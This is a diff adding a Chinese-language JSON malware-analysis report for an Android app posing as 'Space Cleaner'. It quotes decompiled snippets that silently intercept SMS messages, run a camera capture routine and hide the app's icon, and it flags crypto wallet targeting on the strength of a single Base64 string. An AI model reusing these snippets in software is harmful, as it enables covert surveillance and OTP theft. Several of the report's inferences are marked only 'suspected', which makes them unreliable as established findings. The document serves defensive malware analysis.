@@ -1,0 +1,155 @@
+{
+  "APK信息": {
+    "文件名": "3b3d0956ff05803e71649dcf7bdf614f75bef84bbd8b915e765ebabaa27600a9.apk",
+    "sha256": "3b3d0956ff05803e71649dcf7bdf614f75bef84bbd8b915e765ebabaa27600a9",
+    "包名": "com.antivirus.space.cleaner",
+    "应用名": "Space Cleaner",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 520.3
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "wap",
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\dr\\avl\\receiver\\MessageReceiver;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n        abortBroadcast();\n        Bundle extras = intent.getExtras();\n        if (extras != null) {\n            Object[] objArr = (Object[]) extras.get(\"pdus\");\n            SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n            for (int i = 0; i < objArr.length; i++) {\n                smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n            }\n            for (SmsMessage smsMessage : smsMessageArr) {\n                smsMessage.getDisplayOriginatingAddress();\n            }\n        }\n    }\n}",
+          "malicious_code_snippet_context": "      final SimpleDateFormat f761a = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n  \n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n>>>                     smsMessage.getMessageBody();\n>>>                     this.f761a.format(new Date(smsMessage.getTimestampMillis()));\n>>>                 }\n              }\n          }\n      }",
+          "behavior_description": "该BroadcastReceiver监听SMS_RECEIVED广播，在收到短信后立即调用abortBroadcast()终止广播继续传递，阻止系统短信应用及其他应用收到短信通知，从而对用户隐藏短信内容。随后从Intent中提取pdus数据解析出短信发送方地址和内容。这种短信拦截行为常用于隐藏C2控制指令短信或拦截银行验证码（OTP），直接造成用户无法感知关键短信，属于典型的短信拦截恶意行为。数据流向：intent.getExtras().get(\"pdus\")（短信PDU数据来源）→ abortBroadcast()（终止广播隐藏短信）+ SmsMessage.createFromPdu()解析短信内容",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "android.media.action.IMAGE_CAPTURE",
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lns\\cgl;",
+          "method_signature": "if(this.c != null && !this.c.isRecycled()",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "cgg.a(\"takePicture\").a(new Runnable() { \n    public void run() { \n        Looper.prepare(); \n        cgl.this.f3854a = surfaceView.getHolder(); \n        cgl.this.f3854a.setType(3); \n        cgl.this.a(cgl.this.f3854a); \n    } \n});",
+          "malicious_code_snippet_context": "              this.c.recycle();\n              this.c = null;\n          }\n>>>         cgg.a(\"takePicture\").a(new Runnable() { // from class: ns.cgl.1\n>>>             @Override // java.lang.Runnable\n>>>             public void run() {\n>>>                 Looper.prepare();\n>>>                 try {\n>>>                     cgl.this.f3854a = surfaceView.getHolder();\n>>>                     cgl.this.f3854a.setType(3);\n>>>                     cgl.this.a(cgl.this.f3854a);\n                  } catch (Exception e) {\n                      e.printStackTrace();\n                      cgl.this.h = true;",
+          "behavior_description": "代码在后台线程中通过SurfaceView获取SurfaceHolder并设置类型，结合任务标识\"takePicture\"，表明其正在初始化摄像头并进行秘密拍照操作，属于典型的隐私窃取行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lns\\cdy;",
+          "method_signature": "if(componentName == null)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);",
+          "malicious_code_snippet_context": "              return false;\n          }\n          try {\n>>>             context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);\n              return true;\n          } catch (Exception e2) {\n              e2.printStackTrace();",
+          "behavior_description": "通过 PackageManager.setComponentEnabledSetting() 动态启用/禁用指定组件。当参数 z 为 false 时，将组件状态设为 DISABLED(2)，若目标组件为主启动 Activity，则应用图标将从启动器中隐藏，用户无法看到和直接卸载该应用。这是恶意软件常用的图标隐藏技术，用于在安装后隐蔽自身存在。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "crypto_wallet_detection",
+      "中文名": "加密钱包地址采集",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "3447CA69ECC65C251FF41241E62BBD39",
+          "151D281A624318CDE9DCAAD88E8BB381",
+          "UgXzrPdbH/3iHMsrV7tZb551eY3jVMJMSQGGUFhYme8="
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lns\\avc;",
+          "method_signature": "s()",
+          "malicious_behavior": "crypto_wallet_detection",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static String s() { return \"UgXzrPdbH/3iHMsrV7tZb551eY3jVMJMSQGGUFhYme8=\"; }",
+          "malicious_code_snippet_context": "public static String s() { return \"UgXzrPdbH/3iHMsrV7tZb551eY3jVMJMSQGGUFhYme8=\"; }",
+          "behavior_description": "该方法返回一个硬编码的Base64编码字符串，该字符串在运行时被解密后用于加密钱包地址的检测与匹配。恶意软件通过将解密后的字符串（钱包地址特征/正则模式/已知钱包地址）与设备上的剪贴板内容、文件系统或已安装应用数据进行比对，从而识别并采集用户的加密货币钱包地址，为后续资产窃取做准备。数据来源为硬编码加密常量(source)→解密后用于字符串匹配/检测操作(sink)。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
